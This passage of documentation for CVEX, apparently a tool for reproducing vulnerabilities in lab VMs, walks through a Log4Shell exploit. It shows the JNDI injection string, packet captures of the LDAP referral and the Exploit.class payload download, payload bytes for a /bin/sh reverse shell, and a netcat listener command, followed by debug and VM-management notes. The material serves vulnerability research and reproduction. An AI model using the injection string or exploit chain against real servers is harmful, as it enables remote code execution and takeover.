Log4j logs the `${jndi:ldap://192.168.56.4:1389/a}` string. This triggers the JNDI manager to make a request to the LDAP server controlled by the attacker (192.168.56.4:1389). The LDAP server replies with a link to the payload:
```
15:34:04.187067 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 148
E.....@.@.d...8...8..m.V.:..Z3.I...........
.....$G.0.....d....a0..0...javaClassName1...foo0+..javaCodeBase1...http://192.168.56.4:9999/0$..objectClass1...javaNamingReference0...javaFactory1	..Exploit
15:34:04.187088 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 148
E.....@.?.e...8...8..m.V.:..Z3.I...........
.....$G.0.....d....a0..0...javaClassName1...foo0+..javaCodeBase1...http://192.168.56.4:9999/0$..objectClass1...javaNamingReference0...javaFactory1	..Exploit
15:34:04.191353 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 14
E..B..@.@.em..8...8..m.V.:..Z3.I...........
.....$G.0....e.
......
```

JNDI manager requests the payload hosted on http://192.168.56.4:9999/Exploit.class:
```
15:34:04.229544 IP 192.168.56.3.41350 > 192.168.56.4.9999: tcp 213
E..	@.@.>.	...8...8...'...._96.............
.$Ha...8GET /Exploit.class HTTP/1.1
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/1.8.0_102
Host: 192.168.56.4:9999
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```

Web server 192.168.56.4:9999 replies with the payload:
```
15:34:04.385348 IP 192.168.56.4.9999 > 192.168.56.3.41350: tcp 198
E.....@.?..#..8...8.'...96.....4...........
.....$HaHTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.12
Date: Wed, 09 Oct 2024 13:33:51 GMT
Content-type: application/java-vm
Content-Length: 1361
Last-Modified: Wed, 09 Oct 2024 13:33:48 GMT

15:34:04.408072 IP 192.168.56.4.9999 > 192.168.56.3.41350: tcp 1361
E.....@.@.|...8...8.'...96.c...4...........
.....$I........4.f
...-...../..0..1
...2
...3
...4..5
.	.6
.7.8
.7.9
.	.8
.7.:
.	.:
.	.;
.<.=
.<.>
.?.@
.?.A........2
.B.C
.7.D..E
.7.F
.	.G..H..I...<init>...()V...Code...LineNumberTable...StackMapTable..H..1..J..5..K..L..E..
Exceptions..
SourceFile...Exploit.java........192.168.56.4.../bin/sh...java/lang/ProcessBuilder...java/lang/String....M..N.O..P.Q...java/net/Socket....R..J..S.T..U.T..V.W..X.Y..K..Z.[..\.[..L..].^.._....`..a.b..c.[...java/lang/Exception..d....e.....Exploit...java/lang/Object...java/lang/Process...java/io/InputStream...java/io/OutputStream...([Ljava/lang/String;)V...redirectErrorStream...(Z)Ljava/lang/ProcessBuilder;...start...()Ljava/lang/Process;...(Ljava/lang/String;I)V...getInputStream...()Ljava/io/InputStream;...getErrorStream...getOutputStream...()Ljava/io/OutputStream;...isClosed...()Z..	available...()I...read...write...(I)V...flush...java/lang/Thread...sleep...(J)V..	exitValue...destroy...close.!................... ............*.....L...=..N...Y....Y.-S..........:...	Y+...
:......:......:......:......:	.....:
.......`.........
....................
....................	............
....	..............W...:............................!...n.....	...
.............&...1...8...?...F...T...\...d...q...y.................................!..."...$...%...&."...1....T....#..$...$..%..&..'..'..'..(..(......X..)..*...........+.....,
```

The payload connects back to netcat ("nc -nvlp 1234" from cvex.yml), executed by the attacker:
```
15:34:04.462260 IP 192.168.56.3.60972 > 192.168.56.4.1234: tcp 0
E..<I.@.?..Y..8...8..,...g........../A.........
.$IN........
15:34:04.462345 IP 192.168.56.3.60972 > 192.168.56.4.1234: tcp 0
E..<I.@.>..Y..8...8..,...g........../A.........
.$IN........
15:34:04.464332 IP 192.168.56.4.1234 > 192.168.56.3.60972: tcp 0
E..<..@.@.Id..8...8....,.Z...g......"..........
...3.$IN....
15:34:04.464348 IP 192.168.56.4.1234 > 192.168.56.3.60972: tcp 0
E..<..@.?.Jd..8...8....,.Z...g......"..........
...3.$IN....
```

</details>

## Debug

If something goes wrong and re-starting CVEX doesn't help, run it with the `-v` parameter. It will show you even more logs that may help debugging the issue.

## Managing VMs

CVEX executed with `-l` parameter shows the list of cached VMs:
```
$ python3 -m cvex -l
2024-09-19 10:41:45,410 - INFO - [main] Cached VMs:
2024-09-19 10:41:45,410 - INFO - [main] router
2024-09-19 10:41:45,410 - INFO - [main] gusztavvargadr_windows-10/2202.0.2404/1
2024-09-19 10:41:45,411 - INFO - [main] bento_ubuntu-22.04/202404.23.0/1
```

CVEX executed with `-d` parameter destroys the specific VM and deletes all corresponding files:
```
$ python3 -m cvex -d gusztavvargadr_windows-10/2202.0.2404/1
2024-09-19 10:45:57,769 - INFO - [stub] Destroying VM stub...
```

